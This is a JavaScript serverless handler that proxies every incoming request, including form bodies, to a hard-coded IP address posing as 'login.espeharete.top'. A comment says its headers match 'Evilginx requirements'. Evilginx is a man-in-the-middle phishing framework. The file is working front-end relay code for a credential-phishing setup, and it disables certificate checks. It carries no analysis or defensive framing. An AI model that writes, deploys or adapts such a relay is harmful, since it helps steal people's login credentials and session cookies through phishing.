import https from 'https';

export default async function handler(req, res) {
  // Use IP directly with port 443
  const targetHost = '185.165.171.174';
  const targetPath = req.url;
  
  // PERFECTED HEADERS - exactly matching Evilginx requirements
  const headers = {
    'Host': 'login.espeharete.top',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'X-Forwarded-For': req.headers['x-forwarded-for'] || req.ip,
    'X-Real-IP': req.ip
  };

  const options = {
    hostname: targetHost,
    port: 443,
    path: targetPath,
    method: req.method,
    headers: headers,
    rejectUnauthorized: false,
    timeout: 10000 // 10 second timeout
  };

  return new Promise((resolve) => {
    const proxyReq = https.request(options, (proxyRes) => {
      // Remove problematic headers
      const responseHeaders = { ...proxyRes.headers };
      delete responseHeaders['content-length'];
      delete responseHeaders['transfer-encoding'];
      
      // Write status code and filtered headers
      res.writeHead(proxyRes.statusCode || 200, responseHeaders);
      
      // Pipe the response
      proxyRes.pipe(res);
      
      // Handle response completion
      proxyRes.on('end', () => {
        resolve();
      });
    });

    proxyReq.on('error', (err) => {
      console.error('Proxy request error:', err);
      res.status(502).json({ error: 'Bad Gateway', details: err.message });
      resolve();
    });

    // Forward request body if present
    if (req.method !== 'GET' && req.method !== 'HEAD') {
      req.pipe(proxyReq);
    } else {
      proxyReq.end();
    }
  });
}
